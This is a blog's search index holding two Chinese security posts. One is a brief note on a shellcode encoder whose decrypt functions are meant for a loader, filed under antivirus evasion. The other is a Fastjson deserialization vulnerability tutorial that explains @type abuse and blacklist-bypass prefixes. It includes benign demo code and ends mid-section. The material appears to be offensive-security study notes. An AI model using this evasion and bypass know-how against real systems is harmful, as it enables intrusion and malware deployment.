<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ProcessSc-shellcode编码器</title>
    <link href="/2025/08/23/ProcessSc-shellcode%E7%BC%96%E7%A0%81%E5%99%A8/"/>
    <url>/2025/08/23/ProcessSc-shellcode%E7%BC%96%E7%A0%81%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/candyb0x/ProcessSc">https://github.com/candyb0x/ProcessSc</a></p><p>之前是打算写一个 shellcode 编码与加密的文章的，想要实现的效果就是能够直接输入文件得到相应的输出和解密解码函数，但是这个过程遇到了不少问题，所以文章写了一半，就不打算放出来了；</p><p>目前给出的项目也可以说是个半成品吧，里面的加密解密函数都是通过<code>.h</code>的形式实现的，使用提供的<code>.h</code>进行加密，也可以使用其中的解密函数进行解密，直接放置在 Loader 中即可使用，也算比较便捷，不用重新写，配合<code>ollvm</code>使用即可。</p>]]></content>
    
    
    <categories>
      
      <category>免杀对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shellcode</tag>
      
      <tag>加密</tag>
      
      <tag>编码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson反序列化漏洞</title>
    <link href="/2025/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="一、Fastjson-基础"><a href="#一、Fastjson-基础" class="headerlink" title="一、Fastjson 基础"></a>一、Fastjson 基础</h1><h2 id="1-1-Fastjson-序列化与反序列化"><a href="#1-1-Fastjson-序列化与反序列化" class="headerlink" title="1.1 Fastjson 序列化与反序列化"></a>1.1 Fastjson 序列化与反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.candy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;无参构造函数调用！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;带参构造函数调用！&quot;</span> + name);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName()函数调用！&quot;</span> + name);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName()函数调用！&quot;</span> + name);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge()函数调用！&quot;</span> + name);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge()函数调用！&quot;</span> + name);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.candy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">u2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;lisi&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">u3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;wangwu&quot;</span>, <span class="hljs-number">18</span>);<br>        System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString1</span> <span class="hljs-operator">=</span> JSON.toJSONString(u1);<br>        <span class="hljs-comment">// 传入SerializerFeature.WriteClassName可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本        String jsonString2 = JSON.toJSONString(u2, SerializerFeature.WriteClassName);</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString3</span> <span class="hljs-operator">=</span> JSON.toJSONString(u3, SerializerFeature.WriteClassName);<br><br>        System.out.println(jsonString1);<br>        System.out.println(jsonString2);<br>        System.out.println(jsonString3);<br><br>        System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(jsonString1);<br>        System.out.println(parse);<br><br>        System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString2, User.class);<br>        System.out.println(user);<br><br>        System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString3);<br>        System.out.println(jsonObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">带参构造函数调用！zhangsan<br>带参构造函数调用！lisi<br>带参构造函数调用！wangwu<br>=======================<br>getAge()函数调用！zhangsan<br><span class="hljs-title function_">getName</span><span class="hljs-params">()</span>函数调用！zhangsan<br><span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>函数调用！lisi<br><span class="hljs-title function_">getName</span><span class="hljs-params">()</span>函数调用！lisi<br><span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>函数调用！wangwu<br><span class="hljs-title function_">getName</span><span class="hljs-params">()</span>函数调用！wangwu<br>&#123;<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.candy.User&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;lisi&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.candy.User&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;wangwu&quot;</span>&#125;<br>=======================<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;<br>=======================<br>无参构造函数调用！<br>setAge()函数调用！<span class="hljs-literal">null</span><br><span class="hljs-title function_">setName</span><span class="hljs-params">()</span>函数调用！lisi<br>org.candy.User@21bcffb5<br>=======================<br>无参构造函数调用！<br>setAge()函数调用！<span class="hljs-literal">null</span><br><span class="hljs-title function_">setName</span><span class="hljs-params">()</span>函数调用！wangwu<br><span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>函数调用！wangwu<br><span class="hljs-title function_">getName</span><span class="hljs-params">()</span>函数调用！wangwu<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;wangwu&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.candy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;male&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;无参构造函数调用！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;带参构造函数调用！&quot;</span> + name);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName()函数调用！&quot;</span> + name);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName()函数调用！&quot;</span> + name);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge()函数调用！&quot;</span> + name);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge()函数调用！&quot;</span> + name);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setGender</span><span class="hljs-params">(String gender)</span> &#123;<br>        <span class="hljs-built_in">this</span>.gender = gender;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.candy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serStudent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;lisi&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">s3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;wangwu&quot;</span>, <span class="hljs-number">18</span>);<br>        System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString1</span> <span class="hljs-operator">=</span> JSON.toJSONString(s1);<br>        <span class="hljs-comment">// 传入SerializerFeature.WriteClassName可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本        String jsonString2 = JSON.toJSONString(s2, SerializerFeature.WriteClassName);</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString3</span> <span class="hljs-operator">=</span> JSON.toJSONString(s3, SerializerFeature.WriteClassName);<br><br>        System.out.println(jsonString1);<br>        System.out.println(jsonString2);<br>        System.out.println(jsonString3);<br><br>        System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(jsonString1);<br>        System.out.println(parse);<br><br>        System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">Student</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString2, Student.class);<br>        System.out.println(Student);<br><br>        System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString3);<br>        System.out.println(jsonObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">带参构造函数调用！zhangsan<br>带参构造函数调用！lisi<br>带参构造函数调用！wangwu<br>=======================<br>getAge()函数调用！zhangsan<br><span class="hljs-title function_">getName</span><span class="hljs-params">()</span>函数调用！zhangsan<br><span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>函数调用！lisi<br><span class="hljs-title function_">getName</span><span class="hljs-params">()</span>函数调用！lisi<br><span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>函数调用！wangwu<br><span class="hljs-title function_">getName</span><span class="hljs-params">()</span>函数调用！wangwu<br>&#123;<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.candy.Student&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;lisi&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.candy.Student&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;wangwu&quot;</span>&#125;<br>=======================<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;<br>=======================<br>无参构造函数调用！<br>setAge()函数调用！<span class="hljs-literal">null</span><br><span class="hljs-title function_">setName</span><span class="hljs-params">()</span>函数调用！lisi<br>org.candy.Student@21bcffb5<br>=======================<br>无参构造函数调用！<br>setAge()函数调用！<span class="hljs-literal">null</span><br><span class="hljs-title function_">setName</span><span class="hljs-params">()</span>函数调用！wangwu<br><span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>函数调用！wangwu<br><span class="hljs-title function_">getName</span><span class="hljs-params">()</span>函数调用！wangwu<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;wangwu&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-结论"><a href="#1-2-结论" class="headerlink" title="1.2 结论"></a>1.2 结论</h2><ul><li><strong>Fastjson 序列化行为总结</strong><ol><li><strong>序列化时调用 Getter 方法</strong><ul><li>Fastjson 默认通过 <strong>JavaBean 规范</strong>来识别字段，即调用对应的 <code>getXxx()</code> 方法取值 * 没有公开的 <code>getter</code> 方法的 <code>private</code> 成员变量，默认不会被序列化</li><li>但如果直接用 <code>@JSONField</code> 注解标记字段，即使没有 getter 也能被序列化</li><li><code>transient</code> 修饰的字段默认不会被序列化</li></ul></li><li><strong>特殊情况</strong><ul><li>如果字段是 <code>static</code>，不会被序列化</li><li>如果字段是 <code>null</code>，默认会跳过，但可以通过 <code>SerializerFeature.WriteMapNullValue</code> 来输出 <code>null</code> 值</li><li>如果 Getter 方法名不规范（如 <code>geturl</code> 而不是 <code>getUrl</code>），Fastjson 可能无法识别</li><li>如果在 Getter 方法中加入自定义逻辑（如打印日志、计算值），Fastjson 序列化时会执行该逻辑</li></ul></li></ol></li><li><strong>Fastjson 反序列化行为总结</strong><ol><li><strong>反序列化时调用 Setter 方法</strong><ul><li>Fastjson 解析 JSON 时，会按字段名匹配 <strong>JavaBean</strong> 的 <code>setXxx()</code> 方法，调用 setter 来赋值</li><li>如果字段是 <code>public</code> 且无 setter 方法，Fastjson 会直接对该字段赋值</li></ul></li><li><strong>特殊情况</strong><ul><li>如果字段是 <code>private</code> 且无 setter 方法，Fastjson 默认无法赋值，但可以通过 <code>@JSONField</code> 注解或 <code>FieldBased</code> 特性让其直接操作字段</li><li>JSON 中包含未知字段时<ul><li>默认会被忽略</li><li>如果开启 <code>Feature.IgnoreNotMatch</code>，不会报错；如果关闭可能抛异常</li></ul></li><li>JSON 中缺失某个字段时<ul><li>如果 JavaBean 有默认值（如构造函数赋值），则保留默认值</li><li>如果 Setter 方法中带有逻辑（比如日志打印、参数检查），反序列化时会实际执行该逻辑</li></ul></li></ul></li></ol></li></ul><h1 id="二、Fastjson-漏洞原理与机制分析"><a href="#二、Fastjson-漏洞原理与机制分析" class="headerlink" title="二、Fastjson 漏洞原理与机制分析"></a>二、Fastjson 漏洞原理与机制分析</h1><h2 id="2-1-漏洞产生原因"><a href="#2-1-漏洞产生原因" class="headerlink" title="2.1 漏洞产生原因"></a>2.1 漏洞产生原因</h2><h3 id="2-1-1-设计缺陷"><a href="#2-1-1-设计缺陷" class="headerlink" title="2.1.1 设计缺陷"></a>2.1.1 设计缺陷</h3><p><strong>过度的灵活性设计</strong></p><ul><li>Fastjson 为了提供便利的序列化体验，引入了 <code>@type</code> 字段来指定反序列化的目标类型</li><li>这种设计允许在 JSON 数据中动态指定要实例化的 Java 类，为攻击者提供了控制程序执行流程的入口</li><li>缺乏对用户输入类型信息的严格验证和限制机制</li></ul><p><strong>任意类实例化风险</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">外部输入 (@type) → 类型解析 → 反射加载 → 实例创建 → 方法调用 → 危险操作<br></code></pre></td></tr></table></figure><h3 id="2-1-2-自动方法调用机制"><a href="#2-1-2-自动方法调用机制" class="headerlink" title="2.1.2 自动方法调用机制"></a>2.1.2 自动方法调用机制</h3><p><strong>Setter 方法自动调用</strong></p><ul><li>反序列化过程中，Fastjson 会自动调用对象的 setter 方法进行属性赋值</li><li>如果 setter 方法内部包含危险操作（如网络请求、文件操作、系统命令执行），将被无条件触发</li><li>攻击者可以通过构造特定的 JSON 数据来控制 setter 方法的参数</li></ul><p><strong>Getter 方法意外触发</strong></p><ul><li>在特定场景下（如 <code>$ref</code> 引用解析、JSONObject 包装转换），getter 方法会被意外调用</li><li>某些类的 getter 方法内部存在副作用操作，成为攻击利用点</li><li>这种隐式的方法调用往往被开发者忽略</li></ul><p><strong>初始化逻辑执行</strong></p><ul><li>类的构造函数、静态代码块、初始化方法在对象创建时自动执行</li><li>恶意类可以在这些初始化过程中嵌入危险代码</li><li>即使不进行属性赋值，仅实例化就可能触发攻击</li></ul><h3 id="2-1-3-安全机制"><a href="#2-1-3-安全机制" class="headerlink" title="2.1.3 安全机制"></a>2.1.3 安全机制</h3><p><strong>黑白名单绕过</strong></p><ul><li>早期版本缺乏有效的类型校验机制</li><li>后期版本的黑白名单实现存在绕过可能： <ul><li>类名处理逻辑缺陷（如 <code>L;</code>、<code>LL;;</code>、<code>[</code> 等前后缀绕过）</li><li>哈希比对机制存在冲突风险</li><li>缓存机制被恶意利用</li><li>expectClass 参数校验逻辑漏洞</li></ul></li></ul><p><strong>智能特性带来的风险</strong></p><ul><li><strong>smartMatch 智能匹配</strong>：可能触发意外的方法调用</li><li><strong>$ref 引用机制</strong>：延迟解析可能导致额外的计算和方法执行</li><li><strong>容器类型处理</strong>：集合、Map 等容器在元素处理过程中可能触发危险方法</li></ul><h2 id="2-2-反序列化基本流程"><a href="#2-2-反序列化基本流程" class="headerlink" title="2.2 反序列化基本流程"></a>2.2 反序列化基本流程</h2><h3 id="2-2-1-解析入口与初始化"><a href="#2-2-1-解析入口与初始化" class="headerlink" title="2.2.1 解析入口与初始化"></a>2.2.1 解析入口与初始化</h3><p><strong>解析入口点</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 主要入口方法</span><br>JSON.parse(String text)<br>JSON.parseObject(String text)<br>JSON.parseObject(String text, Class&lt;T&gt; clazz)<br>JSON.parseArray(String text, Class&lt;T&gt; clazz)<br></code></pre></td></tr></table></figure><p><strong>流程初始化</strong></p><ol><li>创建 <code>DefaultJSONParser</code> 实例</li><li>初始化 <code>ParserConfig</code> 配置（包含安全策略、黑白名单等）</li><li>准备词法分析器 <code>JSONLexer</code> 进行 Token 解析</li><li>开始逐字符解析 JSON 文本</li></ol><h3 id="2-2-2-核心解析流程"><a href="#2-2-2-核心解析流程" class="headerlink" title="2.2.2 核心解析流程"></a>2.2.2 核心解析流程</h3><p><strong>第一阶段：词法分析</strong></p><ul><li>JSONLexer 将 JSON 文本分解为 Token 流</li><li>识别关键字段，特别是 <code>@type</code> 字段</li><li>处理字符串、数字、布尔值等基本数据类型</li></ul><p><strong>第二阶段：类型确定</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">遇到 @type 字段 → 提取类名 → checkAutoType 安全校验 → TypeUtils.loadClass() 加载类<br></code></pre></td></tr></table></figure><p><strong>第三阶段：对象构造</strong></p><ol><li><strong>类加载验证</strong>：通过反射机制加载指定类</li><li><strong>实例创建</strong>：调用类的构造函数创建对象实例</li><li><strong>反序列化器定位</strong>：寻找适合的 <code>Deserializer</code>（通常是 <code>JavaBeanDeserializer</code>）</li></ol><p><strong>第四阶段：属性绑定</strong></p><ol><li><strong>字段映射</strong>：将 JSON 键与 Java 对象属性进行映射</li><li><strong>Setter 调用</strong>：逐个调用 setter 方法进行属性赋值</li><li><strong>类型转换</strong>：处理数据类型转换（String → Date、Number 转换等）</li><li><strong>嵌套对象处理</strong>：递归处理嵌套的复杂对象</li></ol><h3 id="2-2-3-特殊处理机制"><a href="#2-2-3-特殊处理机制" class="headerlink" title="2.2.3 特殊处理机制"></a>2.2.3 特殊处理机制</h3><p><strong>引用解析机制</strong></p><ul><li><code>$ref</code> 引用在解析时会延迟计算</li><li>可能触发目标对象的 getter 方法</li><li>循环引用检测可能被绕过或利用</li></ul><p><strong>容器类型处理</strong></p><ul><li><strong>集合类（List、Set）</strong>：添加元素时可能触发元素对象的方法</li><li><strong>Map 类</strong>：键值对操作可能触发 key 的 <code>hashCode()</code>、<code>equals()</code> 方法</li><li><strong>数组类型</strong>：数组元素赋值和类型转换过程</li></ul><p><strong>JSONObject&#x2F;JSONArray 包装</strong></p><ul><li>在类型转换过程中会调用目标对象的方法</li><li><code>toJavaObject()</code> 方法可能触发额外的方法调用</li><li>包装和解包装过程存在安全风险</li></ul><h3 id="2-2-4-关键节点与风险点"><a href="#2-2-4-关键节点与风险点" class="headerlink" title="2.2.4 关键节点与风险点"></a>2.2.4 关键节点与风险点</h3><p><strong>类型校验节点（checkAutoType）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 